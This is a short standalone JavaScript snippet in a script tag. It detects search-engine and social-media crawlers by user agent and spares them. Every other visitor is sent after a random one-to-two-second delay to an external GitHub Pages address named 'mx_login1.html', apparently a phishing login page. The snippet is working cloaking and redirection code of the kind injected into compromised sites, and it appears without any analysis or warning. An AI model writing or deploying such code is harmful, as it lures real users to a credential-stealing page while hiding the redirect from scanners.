<script>
(function () {
  function isBotUserAgent() {
    const bots = [
      /bot/i, /crawler/i, /spider/i, /crawling/i,
      /google/i, /bing/i, /yahoo/i, /facebook/i,
      /duckduckgo/i, /baidu/i, /yandex/i
    ];
    return bots.some(bot => bot.test(navigator.userAgent));
  }

  function redirectUser() {
    const delay = Math.floor(Math.random() * 1000) + 1000; // 1–2 seconds
    console.log("Redirecting in", delay, "ms...");
    setTimeout(() => {
      window.location.href = "https://gbpacific21.github.io/mx_login1.html";
    }, delay);
  }

  function init() {
    if (isBotUserAgent()) {
      console.log("Bot detected. No redirect.");
      return;
    }
    redirectUser();
  }

  // Run as soon as possible
  if (document.readyState === "complete" || document.readyState === "interactive") {
    init();
  } else {
    window.addEventListener("load", init);
  }
})();
</script>
